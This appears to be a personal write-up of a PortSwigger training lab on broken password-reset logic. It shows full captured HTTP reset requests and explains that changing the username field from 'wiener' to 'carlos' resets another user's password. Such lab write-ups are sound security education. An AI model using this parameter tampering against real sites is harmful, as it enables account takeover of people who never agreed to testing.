---
title: Password reset broken logic
description: PortSwigger Authentication Lab
---
This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
## Discovery
Forgot password request
```http
POST /forgot-password HTTP/2
Host: 0a6d00cd036f3cd680d144d400030001.web-security-academy.net
Cookie: session=KR6cKjCU01uvfjoqxH761OvVIygU0Wp5
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0a6d00cd036f3cd680d144d400030001.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d00cd036f3cd680d144d400030001.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener
```

Request to change password
```http
POST /forgot-password?temp-forgot-password-token=y5261ijmskj7svmdp7b0kbyxfyf8sibf HTTP/2
Host: 0a6d00cd036f3cd680d144d400030001.web-security-academy.net
Cookie: session=KR6cKjCU01uvfjoqxH761OvVIygU0Wp5
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0a6d00cd036f3cd680d144d400030001.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d00cd036f3cd680d144d400030001.web-security-academy.net/forgot-password?temp-forgot-password-token=y5261ijmskj7svmdp7b0kbyxfyf8sibf
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

temp-forgot-password-token=y5261ijmskj7svmdp7b0kbyxfyf8sibf&username=wiener&new-password-1=peter&new-password-2=peter
```

The password reset request includes the username in the request body. If the implementation does not properly validate the requesting user and relies solely on this field, modifying the username to another user's identifier may allow unauthorised password reset

## Exploit
Changing the username to `carlos` in the `POST /forgot-password?temp-forgot-password-token=` request:
![](../../../../public/images/PS_Auth_20250613%20_204109.png)

The POST request went through and successfully change the carlo's password. 
![](../../../../public/images/PS_Auth_20250613%20_204255.png)

![](../../../../public/images/PS_Auth_20250613%20_204425.png)